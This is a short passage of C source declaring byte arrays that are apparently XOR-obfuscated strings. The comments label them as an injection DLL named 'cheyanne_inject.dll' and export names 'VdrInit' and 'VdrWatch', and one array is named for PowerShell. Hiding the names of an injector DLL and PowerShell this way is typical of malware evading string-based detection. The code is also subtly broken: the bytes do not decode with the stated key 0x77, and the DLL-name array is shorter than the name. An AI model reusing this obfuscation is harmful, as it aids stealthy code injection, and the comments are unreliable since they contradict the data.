...
static const unsigned char xPowerShell[] = {
    0xD1, 0xCE, 0xD6, 0xC4, 0xD3, 0xD2, 0xC9, 0xC4,
    0xCD, 0xCD, 0x8F, 0xC4, 0xD9, 0xC4
};
#define xPowerShell_LEN 14

/* "cheyanne_inject.dll" XOR 0x77 */
static const unsigned char xDllName[] = {
    0xD7, 0xC0, 0xC5, 0xC4, 0xD3, 0xFE, 0xC8, 0xCF,
    0xCB, 0xC4, 0xC2, 0xD5, 0x8F, 0xC5, 0xCD, 0xCD
};
#define xDllName_LEN 16

/* "VdrInit" XOR 0x77 */
static const unsigned char xInitFunc[] = {
    0xF7, 0xC5, 0xD3, 0xE8, 0xCF, 0xC8, 0xD5
};
#define xInitFunc_LEN 7

/* "VdrWatch" XOR 0x77 */
static const unsigned char xWatchFunc[] = {
    0xF7, 0xC5, 0xD3, 0xF6, 0xC0, 0xD5, 0xC2, 0xC9
};
